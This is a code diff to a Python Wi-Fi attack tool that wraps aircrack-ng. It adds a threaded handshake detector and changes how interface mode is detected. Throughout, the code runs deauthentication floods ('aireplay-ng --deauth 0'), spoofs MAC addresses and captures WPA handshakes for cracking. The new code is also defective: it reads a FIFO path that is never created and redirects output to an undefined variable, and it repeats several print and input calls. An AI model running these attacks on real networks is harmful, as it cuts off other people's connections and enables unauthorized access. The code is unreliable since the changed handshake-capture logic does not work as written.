@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 import os
 import re
+import threading
 import time
 import glob
 import random
@@ -23,8 +24,7 @@ terminal_pids = []
 
 terminals = ['x-terminal-emulator', 'gnome-terminal', 'konsole', 'xfce4-terminal']
 terminal_positions = [(0, 0), (0, 400), (0, 800), (800, 0), (800, 400),
-                      (800, 800)]  # top-right, middle-right, bottom-right, top-left, middle-left, bottom-left
-
+                      (800, 800)] 
 
 def check_for_q_press(interval=0.1, timeout=3):
     start_time = time.time()
@@ -149,10 +149,8 @@ def popen_command_new_terminal(command):
                 position_index = len(terminal_pids) % 6
                 x, y = terminal_positions[position_index]
                 terminal_command = f"{terminal} --geometry=80x24+{x}+{y} -e '/bin/sh -c \"{command}; exec bash\"'"
-                # terminal_command = f"{terminal} -e 'bash -c \"{command}; exec bash\"'"
             else:  # xterm
                 terminal_command = f"{terminal} -e 'bash -c \"{command}; exec bash\"'"
-            # print(f"Executing command: {terminal_command}\n")
             process = subprocess.Popen(terminal_command, shell=True, preexec_fn=os.setsid, stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE, text=True)
             terminal_pids.append(process.pid)
@@ -168,15 +166,19 @@ def check_command_output(command):
 
 
 def check_if_selected_interface_in_monitor_mode():
+    global interface_mode
     if not selected_interface:
         if input(f'No {green("Interface")} specified. Do you want to select an interface Y/N : ').lower() == 'y':
             change_interface()
         return
     interface_settings = run_command(f'iwconfig {selected_interface}')
     if 'monitor' in interface_settings.lower():
+        interface_mode = 'monitor'
         return True
+    elif 'managed' in interface_settings.lower():
+        interface_mode = 'managed'
     else:
-        return False
+        interface_mode = 'undefined'
 
 
 def switch_interface_to_monitor_mode():
@@ -226,9 +228,7 @@ def spoof_mac_of_interface_with_random_byte():
 
     print(f'randomly selected mac for {selected_interface} is {random_mac}')
     run_command_print_output(f'ip link set dev {selected_interface} address {random_mac}')
-    # time.sleep(0.3)
     run_command(f'ip link set dev {selected_interface} up')
-    # time.sleep(0.3)
     get_mac_of_interface()
 
 
@@ -291,8 +291,6 @@ def device_deauthentication(timeout=0):
         print(f'Select a {yellow("target Device")} to continue with this attack')
         if input(f'Select a {yellow("target Device")} Y/N : ').lower() == 'y':
             select_target_device()
-        # else:
-        #     return
     switch_interface_channel()
     if not timeout:
         popen_command_new_terminal(
@@ -656,59 +654,80 @@ def capture_handshake():
 
         aireplay = popen_command_new_terminal(f'aireplay-ng --deauth 0 -a {target_bssid} {selected_interface}')
 
-        airodump = popen_command_new_terminal(
-            f'airodump-ng --bssid {target_bssid} -c {target_channel} -w {airodump_handshake_capture_location} {selected_interface}')
+        output_file_path = '/tmp/airodump_output_fifo'
+        def monitor_output_file(output_file_path, handshake_detected_event):
+            pattern = re.compile(r'handshake', re.IGNORECASE)
+            try:
+                with open(output_file_path, 'r') as f:
+                    while not handshake_detected_event.is_set():
+                        line = f.readline()
+                        if line:
+                            print(line, end='')  
+                            if pattern.search(line):
+                                handshake_detected_event.set()
+                                break
+                        else:
+                            time.sleep(0.1)
+            except Exception as e:
+                print(f"Error reading output file: {e}")
+
+        handshake_detected_event = threading.Event()
+
+        monitor_thread = threading.Thread(target=monitor_output_file, args=(output_file_path, handshake_detected_event))
+        monitor_thread.start()
+
+        airodump_command = f'airodump-ng --bssid {target_bssid} -c {target_channel} -w {airodump_handshake_capture_location} {selected_interface} > {fifo_path} 2>&1'
+
+        airodump = popen_command_new_terminal(airodump_command)
 
         timeout = 30
-        while timeout != 0:
-            print(f"Remaining time {green(timeout)} Press Q to cancel")
+        while timeout > 0:
+            print(f"Remaining time {timeout} seconds. Press Q to cancel")
             if check_for_q_press(timeout=1):
                 print("Loop canceled by user.")
                 time.sleep(1)
                 break
+            if handshake_detected_event.is_set():
+                break
             timeout -= 1
-        os.killpg(airodump.pid, signal.SIGTERM)
 
-        airodump_output = ''
         try:
             os.killpg(aireplay.pid, signal.SIGTERM)
             aireplay.wait()
         except ProcessLookupError:
             print('aireplay killed unexpectedly', ProcessLookupError)
-        try:
-            pattern = re.compile(r'handshake:')
-            airodump_output, error = airodump.communicate()
-            airodump.wait()
-            match = pattern.search(airodump_output)
-            if match:
-                clear()
-                print(f"\nHandshake capture {green('SUCCESSFUL')}")
-                print(f"Handshake is saved in '/tmp/{target_ap}-handshakeCapture/'")
-                input('input anything to return to network attacks menu')
-                return
 
-            else:
-                clear()
-                print(f'Handshake capture {red("FAILED")}')
-                print(
-                    'Remember that in order to capture the handshake '
-                    'a device must try to connect to the target SSID')
-                print(
-                    'Reason for no handshake might be that no device was deauthenticated. '
-                    'Try changing the timeout variable of this script in the source code')
-                print(
-                    'Or it might be that the deauthenticated devices did not try to reconnect to the SSID '
-                    '(might happen if only a small amount of devices are connected to target SSID)')
-                remove_files_with_prefix(f'/tmp/{target_ap}-handshakeCapture',
-                                         f'{target_ap}')
-                os.rmdir(f'/tmp/{target_ap}-handshakeCapture')
-                input(
-                    f' press enter to return to network attacks menu and select {green("C2")} to capture the handshake for {green(target_ap)}')
-        except ProcessLookupError:
-            print('airodump killed unexpectedly', ProcessLookupError)
+        if handshake_detected_event.is_set():
+            clear()
+            print(f"\nHandshake capture {green('SUCCESSFUL')}")
+            print(f"Handshake is saved in '/tmp/{target_ap}-handshakeCapture/'")
+            input('Press enter to return to network attacks menu')
+            print(f"\nHandshake capture {green('SUCCESSFUL')}")
+            print(f"Handshake is saved in '/tmp/{target_ap}-handshakeCapture/'")
+            input('input anything to return to network attacks menu')
+            return
+        else:
+            clear()
+            print(f'Handshake capture {red("FAILED")}')
+            clear()
+            print(f'Handshake capture {red("FAILED")}')
+            print(
+                'Remember that in order to capture the handshake '
+                'a device must try to connect to the target SSID')
+            print(
+                'Reason for no handshake might be that no device was deauthenticated. '
+                'Try changing the timeout variable of this script in the source code')
+            print(
+                'Or it might be that the deauthenticated devices did not try to reconnect to the SSID '
+                '(might happen if only a small amount of devices are connected to target SSID)')
+            remove_files_with_prefix(f'/tmp/{target_ap}-handshakeCapture',
+                                     f'{target_ap}')
+            os.rmdir(f'/tmp/{target_ap}-handshakeCapture')
+            input(
+                f' press enter to return to network attacks menu and select {green("C2")} to capture the handshake for {green(target_ap)}')
     else:
         clear()
-        print('{target_ap_authentication} authentication is not supported for handshake capture')
+        print(f'{target_ap_authentication} authentication is not supported for handshake capture')
         print('Only PSK authentication is supported for handshake capture')
         input(f"Press enter to return and select a AP that uses {yellow('PSK')} Authentication")
         return
@@ -1077,10 +1096,9 @@ Previous_Section = Interface
 if __name__ == "__main__":
     while exit != "exit":
         interface_mode = ''
-        if selected_interface != '' and check_if_selected_interface_in_monitor_mode:
-            interface_mode = 'Monitor'
-        elif selected_interface != '' and not check_if_selected_interface_in_monitor_mode:
-            interface_mode = 'Managed'
+        if selected_interface != '':
+            check_if_selected_interface_in_monitor_mode()
+
         clear()
         art = random.choice(ascii_arts)
         for i in art:
